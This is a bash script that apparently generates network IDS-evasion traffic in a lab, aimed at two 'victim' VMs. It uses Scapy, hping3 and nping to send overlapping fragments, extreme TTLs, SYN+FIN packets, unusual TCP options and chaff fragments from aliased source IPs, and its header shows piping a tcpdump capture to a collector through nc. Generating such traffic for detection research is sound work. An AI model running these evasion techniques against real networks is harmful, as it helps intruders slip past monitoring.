#!/usr/bin/env bash
#
# evasion_vm3_random.sh – NIDS Evasion Traffic Generator
#
# • Duration: 600.0s (10.0 min)
# • Random techniques:
#     - frag_overlap   : IP fragmentation overlap (Scapy)
#     - ttl_creep      : Very low/high TTL (hping3)
#     - tcp_invflags   : Contradictory TCP flags SYN+FIN (nping)
#     - tcp_options    : Unusual TCP options (Scapy)
#     - chaff_segments : Small segments/chaff (Scapy)
# • Tools (VM3, attacker):
#     sudo apt update
#     sudo apt install -y hping3 nping python3-scapy
#
# ▶ VM1/VM2 (victims) – capture ALL traffic BEFORE launching the script:
#   sudo tcpdump -U -i enp0s3 -s0 -w - \
#     "net 192.168.56.0/24 and not host 192.168.56.107" \
#     | nc -q 0 192.168.56.107 9999
#
# USAGE (Attacker VM3):
#   sudo ./evasion_vm3_random.sh
#

#
# evasion_ids_parallel.sh - Optimized Evasion IDS Traffic Generator
#
# Features:
# - Use of multiple virtual IPs (aliases) on the interface (no spoofing)
# - Split into multiple parallel workers for maximum throughput
# - IDS evasion techniques only
#

if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo for correct IP alias and raw packet configuration" >&2
  exit 1
fi

# Optimized dependencies
missing=()
for cmd in hping3 nping python3; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done

python3 -c "import scapy" &>/dev/null || missing+=(scapy)

if (( ${#missing[@]} )); then
  echo "ERROR: missing tools: ${missing[*]}" >&2
  exit 1
fi

# Base configuration
duration=600
end_time=$(( SECONDS + duration ))
TARGETS=(192.168.56.101 192.168.56.102)
SRC_IPS=(192.168.56.{240..254})
iface="enp0s3"

# Create IP aliases
for ip in ${SRC_IPS[@]}; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

techs=(frag_overlap ttl_creep tcp_invflags tcp_options chaff_segments)

# Simultaneous workers (more realistic)
workers=4

# Specific technique function
run_technique() {
  local tech=$1 tgt=$2 src=$3

  case "$tech" in
    frag_overlap)
      python3 - <<EOF &>/dev/null &
from scapy.all import IP, Raw, send
payload = b"X"*200
send(IP(src="$src",dst="$tgt",flags="MF")/Raw(payload[:100]), iface="$iface")
send(IP(src="$src",dst="$tgt",frag=5)/Raw(payload[80:]), iface="$iface")
EOF
      ;;

    ttl_creep)
      TTL=$(( RANDOM%2 ? 2 : 255 ))
      hping3 -S -p $((1024+RANDOM%64511)) --ttl $TTL -a "$src" -I "$iface" "$tgt" -c 50 &>/dev/null &
      ;;

    tcp_invflags)
      nping --flags syn+fin -p $((1024+RANDOM%64511)) --source-ip "$src" --interface "$iface" "$tgt" -c 100 &>/dev/null &
      ;;

    tcp_options)
      python3 - <<EOF &>/dev/null &
from scapy.all import IP,TCP,send
opts = [("NOP",None),("SAckOK",b""),("Unknown",b"\x11\x22")]
send(IP(src="$src",dst="$tgt")/TCP(dport=80,flags="S",options=opts), iface="$iface")
EOF
      ;;

    chaff_segments)
      python3 - <<EOF &>/dev/null &
from scapy.all import IP,TCP,Raw,fragment,send
pkt = IP(src="$src",dst="$tgt")/TCP(dport=80,flags="PA")/Raw(b"C"*120)
for frag in fragment(pkt, fragsize=16):
    send(frag, iface="$iface")
EOF
      ;;
  esac
}

worker_func() {
  local end=$1
  while ((SECONDS < end)); do
    tech=${techs[RANDOM % ${#techs[@]}]}
    tgt=${TARGETS[RANDOM % ${#TARGETS[@]}]}
    src=${SRC_IPS[RANDOM % ${#SRC_IPS[@]}]}

    run_technique "$tech" "$tgt" "$src"

    while (( $(jobs -r | wc -l) > 20 )); do sleep 0.05; done
    sleep 0.02
  done
}

# Start parallel workers
for i in $(seq 1 $workers); do
  worker_func "$end_time" &
  echo "Worker $i launched (PID: $!)"
done

# Basic progress monitor
while ((SECONDS < end_time)); do
  sleep 30
  echo "[$(date +%T)] Remaining $((end_time - SECONDS)) seconds, active processes: $(jobs -r | wc -l)"
done

wait
echo "Finished. Cleaning IP aliases..."
for ip in ${SRC_IPS[@]}; do
  ip addr del "$ip"/24 dev "$iface" 2>/dev/null || :
done
